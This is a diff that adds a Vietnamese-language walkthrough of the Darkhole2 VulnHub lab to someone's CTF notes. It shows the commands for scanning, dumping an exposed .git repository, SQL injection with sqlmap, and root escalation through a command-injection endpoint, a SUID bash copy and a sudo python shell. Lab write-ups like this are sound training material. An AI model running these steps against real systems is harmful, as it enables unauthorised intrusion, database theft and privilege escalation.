@@ -241,6 +241,135 @@ Nguồn hướng dẫn: [Đây](https://nepcodex.com/2021/06/phineas-walkthrough
 
 ## III. Darkhole2
 
+Nguồn hướng dẫn: [Đây](https://www.hackingarticles.in/darkhole-2-vulnhub-walkthrough/)
+
+1. Tìm kiếm mục tiêu, quét cổng
+
+   Đầu tiên dùng netdiscover tool để khám phá mạng xung quanh, tìm địa chỉ IP mục tiêu:
+   `netdiscover`
+   
+   Sau khi đã có IP máy mục tiêu, quét các cổng bằng Nmap tool:
+
+   `nmap -A 192.168.1.6`
+
+   - Ta có: 22 ssh, 80 web ( chú ý thư mục .git)
+
+2. Liệt kê
+
+   Xem web bằng trình duyệt:
+
+   ![image](https://github.com/tninh27/Lab/assets/105789492/a00f5f7d-2f8c-4f03-8f3e-d9d3e7077f59)
+
+   ![image](https://github.com/tninh27/Lab/assets/105789492/b9a003e4-b3cc-4ea7-be25-c31d2411473a)
+
+   Xem thư mục .git:
+
+   ![image](https://github.com/tninh27/Lab/assets/105789492/be99293a-947d-4215-9900-fa4b14065fc0)
+
+   Chạy công cụ git-dumper:
+
+   `python3 git_dumper.py http://192.168.1.6/.git/ backup`
+
+   ![image](https://github.com/tninh27/Lab/assets/105789492/6b234414-b84e-43ad-9c83-c390bc01b782)
+
+   Kiểm tra dữ liệu vừa dump được: `git log`
+
+   ![image](https://github.com/tninh27/Lab/assets/105789492/f4a7f5fd-7b3b-4e03-a7f9-9a93e5e21adb)
+
+   Giải mã giá trị:
+
+   `git diff a4d900a8d85e8938d3601f3cef113ee293028e10`
+
+   ![image](https://github.com/tninh27/Lab/assets/105789492/de84412f-f32b-4206-bca3-b4e7a9df6b06)
+
+   - Tìm được tài khoản đăng nhập web
+
+3. Khai thác
+   
+   Đăng nhập tài khoản vừa tìm được:
+   
+   ![image](https://github.com/tninh27/Lab/assets/105789492/2108bffd-2342-49c3-9c24-55e0f6dd2e67)
+
+   Dùng burp suite chặn bắt và lưu cookie trình duyệt vào file *sql*:
+
+   ![image](https://github.com/tninh27/Lab/assets/105789492/7fb56242-1569-4f14-974f-3412dda23049)
+
+   Dùng công cụ sqlmap, khai thác lỗ hổng sql injection:
+
+   `sqlmap -r sql --dbs --batch`
+
+   ![image](https://github.com/tninh27/Lab/assets/105789492/6e37cd68-e8f1-4e9d-b655-5d215bf40038)
+
+   - Tìm được database: darkhole_2, dump dữ liệu trên db này:
+
+   `sqlmap -r sql -D darkhole_2 --dump-all --batch`
+
+   ![image](https://github.com/tninh27/Lab/assets/105789492/6a9a8f3e-ed81-4599-84c1-5dcb36152bfd)
+
+   - Tìm được tài khoản đăng nhập ssh, đăng nhập:
+
+   `ssh jehad@192.168.1.6`
+
+   ![image](https://github.com/tninh27/Lab/assets/105789492/b2813558-6399-45c2-ac6e-94026522f7e8)
+
+4. Leo thang đặc quyền
+
+   Tải công cụ linpeas, cấp quyền và chạy nó:
+
+   ![image](https://github.com/tninh27/Lab/assets/105789492/d9e587de-c615-4d05-8a59-014e91162f67)
+
+   Tìm thấy tài khoản *losy* có thư mục /opt/web, xem nó:
+
+   `cd /opt/web cat index.php`
+
+   ![image](https://github.com/tninh27/Lab/assets/105789492/c79acf12-6c8c-4a74-a5d0-cfd590ab39a1)
+
+   - Người dùng này tồn tại lỗ hổng có thể chạy lệnh cmd
+  
+   Tiến hành đăng nhập với cổng 9999 vừa tìm được:
+
+   ![image](https://github.com/tninh27/Lab/assets/105789492/37d0afd0-87ee-459d-b90f-018928f5d49c)
+
+   Tại đây có thể chạy các lênh CMD thông qua trình duyệt web:
+
+   `curl 127.0.0.1:9999/?cmd=id`
+
+   ![image](https://github.com/tninh27/Lab/assets/105789492/e866e94c-3e09-427e-b7d7-475fa4948961)
+
+   Copy thư mục /bin/bash từ jehad sang losy:
+
+   `curl 127.0.0.1:9999/?cmd=cp%20%2Fbin%2Fbash%20%2Ftmp%2Fuserbash`
+
+   ![image](https://github.com/tninh27/Lab/assets/105789492/df558080-df70-418e-a580-24ab6fbf9cb4)
+
+   Cung cấp quyền shell cho file vừa copy:
+
+   `curl 127.0.0.1:9999/?cmd=chmod%20%2Bs%20%2Ftmp%2Fuserbash`
+
+   ![image](https://github.com/tninh27/Lab/assets/105789492/cc97bf85-bb12-4cb5-91b8-a219b04dbb85)
+
+   Chạy lệnh khai thác: `./userbash -p`
+
+   ![image](https://github.com/tninh27/Lab/assets/105789492/1c504b57-3675-49a3-8709-cfb45ffe28ed)
+
+   Đã có shell của losy, xem file bash_history:
+
+   ![image](https://github.com/tninh27/Lab/assets/105789492/3c9c47b8-2639-4604-9bc4-0edb7a4bcd61)
+
+   - Đã tìm được mật khẩu losy, đăng nhập, kiểm tra quyền:
+
+   ![image](https://github.com/tninh27/Lab/assets/105789492/11886207-353d-4d2e-95c0-c23962ef2d12)
+
+   ![image](https://github.com/tninh27/Lab/assets/105789492/08363d90-fabf-4014-b86e-060f2cdcc2c9)
+
+   - Tồn lại lỗ hổng khai thác bằng cách chiếm quyền điều khiển thư viện python
+
+   Chạy lệnh khai thác, xem file root.txt
+
+   `sudo python3 -c 'import pty; pty.spawn("/bin/bash")'`
+
+   ![image](https://github.com/tninh27/Lab/assets/105789492/c041f2c3-f31c-4694-b7d4-44bac5836f1a)
+
 ## IV. Darkhole2
 
 ## V. Prime1
